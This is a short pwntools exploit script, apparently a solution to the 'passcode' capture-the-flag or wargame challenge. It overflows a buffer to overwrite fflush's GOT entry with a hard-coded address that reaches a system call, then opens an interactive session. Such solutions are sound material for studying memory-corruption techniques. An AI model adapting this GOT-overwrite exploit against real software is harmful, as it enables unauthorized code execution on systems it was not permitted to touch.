from pwn import *

#context.log_level = 'debug'
elf = ELF('passcode')

fflush_got = elf.got['fflush']
system = 0x080485E3

io = process('passcode')
io.recvline()
io.sendline('a'*96 + p32(fflush_got))
print io.recvuntil(':')
io.sendline(str(system))
io.interactive()

